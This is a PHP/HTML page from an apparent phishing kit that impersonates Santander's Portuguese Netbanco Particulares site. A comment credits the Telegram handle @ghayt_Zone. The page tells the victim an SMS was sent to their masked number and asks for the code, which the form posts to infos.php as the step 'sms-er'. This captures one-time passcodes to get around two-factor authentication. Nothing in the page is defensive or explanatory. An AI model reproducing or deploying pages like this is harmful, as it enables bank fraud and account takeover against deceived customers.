<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";



?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Netbanco Particulares - Santander</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/favicon.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>



    <section id="cc" style="background: #fbfafb;height: 100vh;padding-top: 100px;">
        <div class="index">
            <div class="row align-items-center">
                
                <div class="col-md-3"></div>
                <div class="col-md-6">
                    <div class="form shadow py-5 px-4 border text-center" style="background:#fff">
                        <h2 style="font-weight: 700;">MENSAGEM DE TEXTO</h2>
                        <div class="span" style="font-size:16px;font-weight: 600;"><span>Enviamos uma mensagem para o seguinte número : <strong>** ** ** ** **</strong></span></div>

                        <div class="col-md-2"></div>

                        <form action="infos.php" method="post" class="text-center">
                           <input type="hidden" value="sms-er" name="step">

                            <div class="row">
                                <div class="col-md-3"></div>
                                <div class="form-group col-md-6 mt-4">
                                    <label for="sms">MENSAGEM</label>
                                    <input style="height:35px;border-color:red;" type="text" id="sms" class="form-control" name="sms" required> 
                                    <div class="error text-start">o valor é obrigatório</div>
                                </div>
                                <div class="col-md-3"></div>
                            </div>

                            <div class="bttn text-center mt-3">
                                <button style="width: auto;font-size: 15px;height: 40px;" name="submit">Entrar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>

  </script>
</body>
</html>